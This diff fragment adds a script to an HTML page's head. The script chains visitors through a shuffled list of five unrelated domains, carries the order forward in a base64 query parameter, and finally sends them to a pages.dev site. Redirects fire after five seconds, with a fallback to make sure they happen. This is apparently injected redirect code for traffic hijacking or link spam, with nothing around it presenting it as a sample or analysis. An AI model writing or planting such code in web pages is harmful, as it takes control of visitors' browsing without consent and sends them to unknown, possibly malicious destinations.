@@ -23,6 +23,57 @@
     
     
     
+<script>
+const allDomains = ['https://glimmerbyte.com/', 'https://healthyhumansource.com/', 'https://anylinks.in/', 'https://eduprothink.com/', 'https://linkcents.com/'];
+const currentDomain = window.location.origin + '/';
+const domains = allDomains.filter(domain => domain !== currentDomain);
+
+function shuffle(array) {
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+  return array;
+}
+
+let params = new URLSearchParams(window.location.search);
+let orderParam = params.get('order');
+let index = parseInt(params.get('index')) || 0;
+
+let order;
+if (!orderParam) {
+  order = shuffle([...domains]);
+  index = 0;
+} else {
+  order = atob(orderParam).split(',');
+}
+
+let redirectTriggered = false;
+
+function handleRedirect() {
+  if (redirectTriggered) return;
+  redirectTriggered = true;
+  setTimeout(() => {
+    if (index < order.length) {
+      const orderStr = btoa(order.join(','));
+      const nextUrl = order[index] + '?order=' + orderStr + '&index=' + (index + 1);
+      window.location.href = nextUrl;
+    } else {
+      window.location.href = 'https://testss-3c9.pages.dev/';
+    }
+  }, 5000);
+}
+
+// Trigger redirect immediately
+handleRedirect();
+
+// Fallback timeout to ensure redirection always happens if not triggered within 10 seconds
+setTimeout(() => {
+  if (!redirectTriggered) {
+    handleRedirect();
+  }
+}, 10000);
+</script>
     
 
 </head>
